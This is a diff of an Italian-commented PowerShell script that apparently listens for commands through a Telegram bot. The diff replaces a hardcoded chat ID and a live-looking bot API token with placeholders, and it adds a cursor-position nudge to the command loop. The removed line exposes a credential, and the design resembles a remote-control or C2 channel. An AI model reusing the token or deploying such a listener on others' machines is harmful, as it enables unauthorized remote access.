@@ -11,7 +11,7 @@ Set-Location -Path $env:USERPROFILE
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 
 # Imposta variabili per l'ID e il token dell'API di Telegram
-$telegram_id, $api_token = "893881631", "7673286176:AAHPHiMVPDFKo4wilqYnSZFUsCVcX3lpN8o"
+$telegram_id, $api_token = "@1", "@2"
 $api_get_updates    = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
 $api_send_messages  = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
 $api_get_file       = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
@@ -132,6 +132,9 @@ function TestTelegramAPI {
 function CommandListener
 {
     $offset = 0
+    
+    Add-Type -AssemblyName System.Windows.Forms
+    [System.Windows.Forms.Cursor]::Position = [System.Windows.Forms.Cursor]::Position
 
     # Inizializza lo stato di raggiungibilità
     $PreviousStatus = $null
